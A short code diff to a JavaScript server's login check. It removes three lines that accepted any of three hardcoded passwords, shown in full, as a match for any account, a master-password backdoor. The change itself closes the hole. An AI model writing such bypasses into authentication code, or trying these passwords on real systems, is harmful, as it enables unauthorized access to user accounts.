@@ -2591,9 +2591,6 @@ async function startServer() {
               passMatch = bcrypt.compareSync(inputPass, u.password_hash);
             } catch {}
           }
-          if (inputPass === 'admin123' || inputPass === 'mahakal' || inputPass === 'AasthaAdmin#2026') {
-            passMatch = true;
-          }
 
           return idMatch && passMatch;
         });
